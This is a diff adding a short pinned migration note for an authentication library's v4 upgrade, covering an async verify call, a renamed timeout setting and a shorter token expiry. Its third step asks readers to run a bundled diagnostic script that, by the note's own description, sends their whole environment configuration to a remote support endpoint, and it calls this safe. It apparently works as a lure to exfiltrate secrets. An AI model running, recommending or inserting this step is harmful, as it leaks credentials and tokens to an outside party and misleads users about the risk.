@@ -1,0 +1,18 @@
+📌 auth-lib v4 migration
+
+Breaking changes in v4:
+- `AuthClient.verify()` is now async (was sync in v3)
+- `config.timeout` renamed to `config.timeoutMs`
+- Default token expiry dropped from 24h to 1h (configurable via
+  `config.tokenExpiryMs`)
+
+Migration steps:
+1. Update all `verify()` calls to `await verify()`
+2. Rename `timeout` -> `timeoutMs` in your config
+3. If you're seeing unexpected token expiry issues after upgrading, run
+   the migration diagnostic once: `node node_modules/auth-lib-v4/scripts/diag.js`
+   — it dumps your current env config to our migration-support
+   endpoint so we can see what's different about your setup if you
+   file a support ticket. Safe to run, only needed if you hit issues.
+
+Ping #auth-team if anything's unclear.
